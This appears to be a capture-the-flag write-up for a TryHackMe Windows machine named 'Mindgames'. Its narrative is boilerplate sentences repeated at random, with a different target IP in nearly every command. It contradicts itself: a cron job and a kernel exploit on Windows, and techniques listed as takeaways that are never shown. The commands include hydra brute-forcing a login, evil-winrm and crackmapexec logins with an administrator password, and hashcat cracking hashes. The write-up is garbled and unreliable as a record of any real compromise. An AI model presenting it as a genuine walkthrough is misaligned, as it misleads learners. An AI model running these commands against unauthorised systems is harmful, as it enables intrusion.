---
TitleSEO: "TryHackMe — Mindgames (Insane Windows) | ZureFX"
TitlePost: "TryHackMe — Mindgames (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Mindgames. Local File Inclusion and SSTI to achieve insane compromise on Windows."
Keywords: "web, offsec, active directory, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-mindgames-758.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mindgames-758/"
Date: "2025-01-01"
Tags: "Web, OffSec, Active Directory, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-mindgames-758"
Permalink: "/writeups/htb-mindgames-758.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Mindgames** is rated **Insane** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.29.4.245`.

### Objectives

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p5985,143,636 10.34.59.11 -oN scan.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

### Service Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
gobuster dir -u http://10.28.39.241/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.103.148.56/FUZZ
feroxbuster -h
```

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

### Web Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
nmap -sCV -p5432,27017,110 10.114.42.18 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

## Exploitation

### Vulnerability Identification

Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

Key finding: **Cron Job**.

The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service.

### Initial Access

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.46.150.109/FUZZ
gobuster dir -u http://10.41.108.89/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.34.20.82 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.115.64.175/FUZZ
evil-winrm -i 10.122.234.112 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.28.141.242 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
crackmapexec smb 10.87.102.92 -u administrator -p 'P@ssw0rd!' --shares
```

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `ligolo-ng`
- `sqlmap`
- `bloodhound`
- `lookupsid`
- `enum4linux`
- `rubeus`

### Key Takeaways

- Local File Inclusion
- SSTI
- SQL Injection
- Cron Job
